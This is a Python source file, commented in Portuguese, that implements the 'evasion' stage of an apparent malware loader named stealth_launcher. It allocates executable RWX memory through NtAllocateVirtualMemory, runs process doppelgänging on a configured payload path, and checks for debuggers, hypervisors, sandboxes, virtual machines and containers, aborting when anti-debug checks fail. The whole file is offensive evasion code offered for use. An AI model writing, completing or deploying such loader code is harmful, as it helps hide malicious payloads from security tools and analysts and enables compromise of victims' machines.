#!/usr/bin/env python3
import logging
import ctypes
from ctypes import windll, c_void_p, byref, c_size_t
from stealth_launcher.exceptions import StageError
from stealth_launcher.advanced.evasion_techniques import (
    anti_hypervisor,
    detect_sandbox,
    detect_vm,
    detect_hypervisor_timing_gpu,
    fingerprint_hardware_unique,
    evasion_container
)
from stealth_launcher.advanced.doppelganging import process_doppelganging

# Constantes para alocação de memória
MEM_COMMIT = 0x1000
PAGE_EXECUTE_READWRITE = 0x40

def allocate_exec_memory(size: int) -> c_void_p:
    """
    Aloca uma região de memória executável no processo atual.
    Em caso de falha, registra o erro e continua (não aborta o fluxo inteiro).
    """
    try:
        base_address = c_void_p(0)
        region_size = c_size_t(size)

        status = windll.ntdll.NtAllocateVirtualMemory(
            c_void_p(-1),  # CurrentProcess
            byref(base_address),
            0,
            byref(region_size),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        )
        if status != 0:
            logging.warning(f"[Evasion] NtAllocateVirtualMemory falhou com status 0x{status:08x}")
            return None
        return base_address
    except Exception as e:
        logging.error(f"[Evasion] Exception ao alocar memória: {e}")
        return None

def evasion_stage(cfg):
    logging.info("=== Stage: evasion ===")

    # 0. (Opcional) tentativa de alocação executável (não crítica)
    exec_mem = allocate_exec_memory(0x1000)
    if exec_mem:
        logging.debug(f"[Evasion] Memória executável alocada em {exec_mem}")
    else:
        logging.warning("[Evasion] Memória executável não alocada, prosseguindo")

    # 1. Doppelgänging (extremamente stealth)
    try:
        process_doppelganging(cfg.payload_path)
        logging.info("[Evasion] Process Doppelgänging executado com sucesso")
    except Exception as e:
        logging.error(f"[Evasion] Falha no process_doppelganging: {e}")
        # Apenas loga erro, não para a execução

    # 2. Anti-debug/hypervisor (se falhar, aborta)
    try:
        if not anti_hypervisor():
            raise StageError("Detecção de hypervisor/anti-debug falhou")
    except Exception as e:
        logging.error(f"[Evasion] Falha inesperada no anti_hypervisor: {e}")
        raise StageError("Detecção de hypervisor/anti-debug falhou (fallback)")

    # 3. Testes não-críticos
    try:
        if not detect_sandbox():
            logging.warning("[Evasion] Sandbox detectada (continua)")
        if not detect_vm():
            logging.warning("[Evasion] VM detectada (continua)")
    except Exception as e:
        logging.warning(f"[Evasion] Falha em testes de ambiente: {e}")

    # 4. Outros checks
    try:
        detect_hypervisor_timing_gpu()
        fingerprint_hardware_unique()
        evasion_container()
    except Exception as e:
        logging.warning(f"[Evasion] Falha em checks adicionais: {e}")

    logging.info("=== Stage: evasion concluído ===")
